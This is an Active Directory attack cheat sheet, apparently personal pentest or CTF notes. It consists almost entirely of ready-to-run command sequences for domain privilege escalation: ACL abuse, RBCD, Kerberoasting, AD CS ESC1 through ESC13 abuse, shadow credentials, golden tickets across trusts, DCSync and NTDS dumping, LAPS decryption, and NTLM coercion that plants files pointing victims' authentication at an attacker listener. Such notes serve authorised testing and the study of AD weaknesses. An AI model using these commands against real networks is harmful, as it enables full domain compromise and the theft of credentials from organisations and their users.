# Active Directory

Collection → graph analysis → ACL abuse, the standard AD escalation loop once you have one domain credential.

```bash
nxc smb <DC_IP> -u <USER> -p '<PASS>'
nxc smb <DC_IP> -u <USER> -p '<PASS>' --generate-hosts-file hosts
# /etc/hosts: <DC_IP>  <DC_FQDN> <domain> <DC_SHORTNAME>

bloodhound-ce.py -u '<USER>' -p '<PASS>' -d <domain> -dc <DC_FQDN> -ns <DC_IP> -c All --zip

# if BloodHound shows you have AddMember on a privileged-nested group:
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' add groupMember '<GROUP>' <USER>

nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3d / admin
evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
```

RBCD via a self-created machine account (works if `MachineAccountQuota` lets you create one):

```bash
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass '<PW>' \
  -dc-host <DC_SHORTNAME> -domain-netbios <domain> '<domain>/<USER>:<PASS>'

rbcd.py -dc-ip <DC_IP> -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to '<DC_SHORTNAME>$' -action 'write' '<domain>/<USER>:<PASS>'

getST.py -spn 'cifs/<DC_FQDN>' -impersonate 'Administrator' \
  '<domain>/ATTACKERSYSTEM$:<PW>'

export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<REALM>.ccache
smbexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
secretsdump.py -k -no-pass <domain>/Administrator@<DC_FQDN>   # full NTDS dump
```

RBCD also works through an ACL you already hold (`GenericWrite`/`GenericAll` on a computer object) — skip the machine-account creation step and go straight to `rbcd.py ... -delegate-from <existing-account> -action write`.

Kerberoasting / AS-REP roasting / RID cycling (no special rights needed to start):

```bash
nxc smb <DC_IP> -u guest -p '' --rid                              # RID cycling via null/guest session -> usernames
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt         # accounts with "no preauth required"
hashcat -a0 -m18200 asrep.txt <WORDLIST>

nxc ldap <DC_IP> -u guest -p '' --kerberoasting kerb.txt           # kerberoastable SPNs, even unauthenticated
hashcat -a0 -m13100 kerb.txt <WORDLIST>

# targeted kerberoast: if you have GenericWrite on a user with no SPN, give them one and roast just them
targetedKerberoast.py -d <domain> -u <USER> -p '<PASS>' --request-user <TARGET_USER> --dc-ip <DC_IP>
hashcat -a0 -m13100 <target>.blob <WORDLIST>
```

NTLM coercion from a writable share (when direct cred access stalls): drop a file containing a UNC path (e.g. inside a script a scheduled job will open) pointing at a rogue SMB listener, capture the resulting NTLMv2 hash, then crack it:

```bash
smbserver.py -smb2support <share-name> <local-dir>   # or Responder/ntlmrelayx, depending on setup
# planted file references: \\<LHOST>\<share-name>\whatever
hashcat -a0 -m5600 hash.txt <WORDLIST>
```

AD CS ESC1 (misconfigured template lets you request a cert for an arbitrary UPN):
```bash
certipy-ad find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
certipy-ad req -username <USER> -password '<PASS>' -ca <CA_NAME> -target <DC_FQDN> \
  -template <vulnerable-template> -upn <target-privileged-user>@<domain> -dns <DC_IP>
certipy-ad auth -pfx <issued>.pfx -dc-ip <DC_IP>        # returns the target's NT hash
```
ESC4: if you only have *write* access to the template object (not an already-vulnerable one), set the flags yourself first, then it's ESC1 from there:
```bash
# via PowerView-style AD object editing:
Set-DomainObject -XOR @{'mspki-enrollment-flag'=2}       # ENROLLEE_SUPPLIES_SUBJECT
Set-DomainObject -Set @{'mspki-certificate-name-flag'=1}
Set-DomainObject -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'}  # Client Auth EKU
```

RBCD empty-hash workaround when the acting account has no usable password (e.g. guest):
```bash
rbcd.py <domain>/guest -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  -dc-ip <DC_IP> -delegate-to <DC>$ -delegate-from <attacker-machine>$ -action write
```

Golden Ticket across a parent/child domain trust — inject an extra SID to get Enterprise Admins instead of just child-domain rights (after DCSync'ing the child's krbtgt):
```bash
ticketer.py -nthash <krbtgt-hash> -domain <child.domain> -domain-sid <child-SID> \
  -extra-sid <parent-domain-SID>-519 Administrator   # 519 = Enterprise Admins RID
```

Shadow Credentials — if you have `GenericWrite` on a user/computer object, add an attacker-controlled key credential instead of resetting their password (quieter, doesn't break their existing access):
```bash
python pywhisker.py -d <domain> -u <USER> -p '<PASS>' --target <TARGET> --action add   # writes msDS-KeyCredentialLink, outputs a PFX
gettgtpkinit.py -cert-pfx <issued>.pfx -pfx-pass <pfx-password> <domain>/<TARGET> <target>.ccache
export KRB5CCNAME=<target>.ccache
getnthash.py -key <session-key-from-pkinit-output> <domain>/<TARGET>   # recover their NT hash via U2U
```

ESC13 (issuance policy OID linked to a privileged group) — certipy flags it directly; just request the template:
```bash
certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -vulnerable
certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <template> -key-size 4096   # bump key size if the default is rejected
certipy auth -pfx <issued>.pfx -dc-ip <DC_IP>
```

ESC3 (template has the Certificate Request Agent EKU) — lets you enroll an agent cert, then use it to request a cert *on behalf of* anyone else:
```bash
certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <enrollment-agent-template>
certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User \
  -on-behalf-of '<DOMAIN>\Administrator' -pfx <agent-cert>.pfx
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

ESC7 (you hold Manage CA / Manage Certificates rights on the CA itself) — approve your own pending request after enabling a privileged template:
```bash
certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -add-officer <USER>
certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -enable-template SubCA
certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -template SubCA \
  -upn 'administrator@<domain>' -sid '<domain-SID>-500'                 # returns a pending request ID
certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -issue-request '<request-ID>'
certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -retrieve '<request-ID>'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

ESC8 (AD CS Web Enrollment reachable over HTTP, no Extended Protection for Authentication) — relay any coerced machine-account auth into a cert request, no template misconfig needed:
```bash
certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -scheme ldap -vulnerable   # look for "ESC8": "Web Enrollment is enabled..."
certipy relay -target 'http://<CA_HOST>' -template DomainController &
petitpotam.py -u <USER> -p '<PASS>' <LISTENER_IP> <DC_IP>          # coerces the DC machine account to auth to your relay
certipy auth -pfx <dc-host>.pfx -dc-ip <DC_IP>                     # -> DC$ machine account NT hash
secretsdump.py '<domain>/<dc-host>$'@<DC_FQDN> -hashes :<HASH>     # DCSync
```

Backup Operators group membership — this group can remotely dump SAM/SYSTEM registry hives without ever getting an interactive session:
```bash
nxc smb <target> -u <USER> -H '<hash>' -M backup_operator    # drives the remote backup+download for you
# or manually:
reg.py '<domain>/<USER>'@<target> -hashes ':<hash>' backup -o '\\<attacker-share>'
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
```

LAPS v2 (DPAPI-NG encrypted blobs) — the plaintext local-admin password is now wrapped in DPAPI-NG, not AES; strip the 16-byte header, then let the DC unwrap it over Kerberos (requires read rights on `msLAPS-EncryptedPassword`, granted to whatever principal the LAPS policy names):
```bash
bloodyAD -d <domain> -u <USER> -k --host <DC_FQDN> msldap laps      # dumps raw blobs (current + password history)
```
```python
import dpapi_ng
data = raw_blob[16:]   # strip the KDSK header
dpapi_ng.ncrypt_unprotect_secret(data, server="<DC_FQDN>", auth_protocol="kerberos").decode("utf-16-le")
```

Deleted-object (tombstone) restore via a `restore` right — if an ACL abuse chain gives you write access to a deleted account's tombstone, restoring it resurrects the account with its original group memberships/ACLs intact, which can reopen an otherwise-closed privilege path:
```bash
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' set restore '<deleted-sAMAccountName>' --newParent '<target-OU-DN>'
```

Targeted Kerberoast against an AES-only account (`msDS-SupportedEncryptionTypes` excludes RC4) — Impacket's `GetUserSPNs.py` requests RC4 by default and gets rejected; patch it to request AES instead:
```bash
sed -i 's/int(constants.EncryptionTypes.rc4_hmac.value)/int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)/g' \
  $(python3 -c "import impacket,os;print(os.path.dirname(impacket.__file__))")/krb5/kerberosv5.py
GetUserSPNs.py -dc-host <DC_FQDN> -request -k -no-pass '<domain>/<USER>$'   # -> $krb5tgs$18$... (etype 18 = AES256)
hashcat -m19700 -a0 hash.txt <WORDLIST>
```

Stolen CA attack — if you land local admin on the CA server itself (not just a vulnerable template), export the CA's private key and forge a certificate for any user offline, no enrollment needed at all:
```bash
certipy ca -backup -ca '<CA_NAME>' -username '<USER>@<domain>' -password '<PASS>' -dc-ip <DC_IP> -target <CA_HOST>
certipy forge -ca-pfx '<CA_NAME>.pfx' -upn '<target-user>@<domain>' -subject 'CN=<target-user>,CN=Users,DC=<DC1>,DC=<DC2>' \
  -sid '<target-user-SID>' -crl 'ldap:///'   # -crl is required if PKINIT auth fails revocation-check without it
certipy auth -pfx '<target-user>_forged.pfx' -dc-ip <DC_IP> -username '<target-user>' -domain <domain>
```

DCC2 (domain cached credentials) cracking — once you have local admin on any domain-joined box, `secretsdump`'s LSA dump often includes a cached logon hash for a domain user who's RDP'd/logged in there before, even a Domain Admin:
```bash
secretsdump.py -hashes ':<local-admin-hash>' '<domain>/Administrator@<HOST>' -local-auth   # look for the DCC2 blob in the output
hashcat -m2100 dcc2_hash.txt <WORDLIST>
```

CVE-2025-24054 (.library-ms NTLM coercion) — planting a crafted `.library-ms` file on any writable share coerces NTLM auth from whoever's machine renders it in Explorer, same outcome as the classic .lnk/SCF coercion but via a newer file type:
```bash
python exploit.py --server <LHOST> --filename '<name>'    # public PoC, builds <name>.library-ms with <url>\\<LHOST>\share</url>
smbclient.py <user>@<target>   # put the generated file onto any writable share
sudo responder -I <iface>
hashcat -a0 -m5600 captured.NTLMv2-SSP <WORDLIST>
```

Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
```bash
nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
hashcat --username -a0 -m31300 hashes.txt <WORDLIST>   # mode needs a recent hashcat (7.x); older builds lack it
```

Object relocation across OUs — if you can write `distinguishedName` on an object, moving it into a more permissive OU makes it inherit that OU's ACL (useful when one tier/OU has a stray `GenericAll`+inherit ACE the others don't):
```bash
bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CN=target,OU=restrictive-OU,...>' distinguishedName -v '<CN=target,OU=permissive-OU,...>'
bloodyAD --host <DC_FQDN> -d <domain> -k set password <target> '<newpass>'   # now inherited GenericAll lets this through
```

Kerberoast encryption downgrade — if `targetedKerberoast` only returns an AES ticket (etype 18, uncrackable without the plaintext), and you hold write on the target's `msDS-SupportedEncryptionTypes`, force RC4 instead of patching Impacket:
```bash
bloodyAD --host <DC_FQDN> -d <domain> -k set object <TARGET_USER> msDS-SupportedEncryptionTypes -v 4   # 4 = RC4 only
targetedKerberoast.py -k --dc-host <DC_FQDN> -d <domain> -u <USER> --request-user <TARGET_USER>   # now $krb5tgs$23$ (RC4)
hashcat -m13100 -a0 hash.txt <WORDLIST>
```

Constrained delegation with protocol transition abuse — if you can set `msDS-AllowedToDelegateTo` and the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC flag on an account you control (e.g. via prior `GenericAll`/`GenericWrite`), it can request a ticket to any service *as anyone*, including Administrator (S4U2Self + S4U2Proxy, no target password needed):
```bash
bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CONTROLLED_ACCT>' msDS-AllowedToDelegateTo -v '<spn, e.g. ldap/DC_FQDN>'
bloodyAD --host <DC_FQDN> -d <domain> -k add uac '<CONTROLLED_ACCT>' -f TRUSTED_TO_AUTH_FOR_DELEGATION
getTGT.py '<domain>/<CONTROLLED_ACCT>:<PASS>'
export KRB5CCNAME=<CONTROLLED_ACCT>.ccache
getST.py '<domain>/<CONTROLLED_ACCT>' -spn <same-spn> -impersonate Administrator -k -no-pass -dc-ip <DC_IP>
export KRB5CCNAME=Administrator@<spn-with-underscores>@<REALM>.ccache
secretsdump.py -k -no-pass <DC_FQDN>                 # DCSync as impersonated Administrator
```

